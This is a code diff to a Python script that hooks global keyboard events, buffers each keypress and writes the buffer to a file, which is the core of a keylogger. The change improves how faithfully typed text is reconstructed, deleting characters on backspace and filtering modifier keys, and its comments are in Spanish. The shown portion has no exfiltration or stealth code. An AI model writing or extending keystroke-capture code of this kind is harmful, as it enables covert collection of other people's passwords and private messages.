@@ -6,18 +6,24 @@ import keyboard
 key_buffer = []
 buffer_lock = threading.Lock()
 
-# Lista de teclas especiales que NO quieres guardar
 IGNORED_KEYS = {
-    "shift", "ctrl", "alt", "caps lock", "backspace",
-    "tab", "enter", "esc", "up", "down", "left", "right"
+    "shift", "ctrl", "alt", "caps lock",
+    "tab", "enter", "esc", "up", "down", "left", "right", "mayusculas", "alt gr"
 }
 
-def pressedKeys(key):
+def pressedKeys(event):
     with buffer_lock:
-        if key.name == "space":
+        combo = keyboard.get_hotkey_name()
+
+        
+        if event.name == "space":
             key_buffer.append(" ")
-        elif key.name not in IGNORED_KEYS:
-            key_buffer.append(key.name)
+        elif event.name == "backspace":
+            # Eliminar el último carácter si existe
+            if key_buffer:
+                key_buffer.pop()
+        elif event.name not in IGNORED_KEYS:
+            key_buffer.append(event.name)
 
 def write_buffer_to_file():
     global key_buffer
